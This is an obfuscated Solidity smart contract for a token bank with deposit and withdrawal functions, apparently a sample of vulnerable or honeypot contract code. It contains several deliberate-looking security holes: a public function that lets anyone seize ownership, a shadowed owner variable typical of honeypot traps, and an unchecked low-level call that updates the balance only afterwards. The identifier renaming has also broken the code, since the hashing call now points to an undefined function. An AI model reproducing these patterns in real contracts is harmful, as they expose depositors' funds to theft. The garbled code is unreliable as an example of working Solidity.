pragma solidity ^0.4.18;

contract Ownable
{
    address _0x1f62d6;
    address _0x28beb1 = msg.sender;

    function _0x2af7c0(address _0x4166b7)
    public
    _0xdee8c3
    {
        _0x1f62d6 = _0x4166b7;
    }

    function _0xef0319()
    public
    {
        if(msg.sender==_0x1f62d6)
        {
            _0x28beb1=_0x1f62d6;
        }
    }

    modifier _0xdee8c3
    {
        if(_0x28beb1 == msg.sender)_;
    }
}

contract Token is Ownable
{
    address _0x28beb1 = msg.sender;
    function WithdrawToken(address _0xc2c2af, uint256 _0x028fb0,address _0xb30dd3)
    public
    _0xdee8c3
    {
        _0xc2c2af.call(bytes4(_0x0f5bf7("transfer(address,uint256)")),_0xb30dd3,_0x028fb0);
    }
}

contract TokenBank is Token
{
    uint public MinDeposit;
    mapping (address => uint) public Holders;


    function _0x2cca31()
    public
    {
        _0x28beb1 = msg.sender;
        MinDeposit = 1 ether;
    }

    function()
    payable
    {
        Deposit();
    }

    function Deposit()
    payable
    {
        if(msg.value>MinDeposit)
        {
            Holders[msg.sender]+=msg.value;
        }
    }

    function WitdrawTokenToHolder(address _0x3d8e5c,address _0x0da7f3,uint _0xd6d46f)
    public
    _0xdee8c3
    {
        if(Holders[_0x3d8e5c]>0)
        {
            Holders[_0x3d8e5c]=0;
            WithdrawToken(_0x0da7f3,_0xd6d46f,_0x3d8e5c);
        }
    }

    function WithdrawToHolder(address _0x8c01ef, uint _0x42ad36)
    public
    _0xdee8c3
    payable
    {
        if(Holders[msg.sender]>0)
        {
            if(Holders[_0x8c01ef]>=_0x42ad36)
            {
                _0x8c01ef.call.value(_0x42ad36);
                Holders[_0x8c01ef]-=_0x42ad36;
            }
        }
    }

}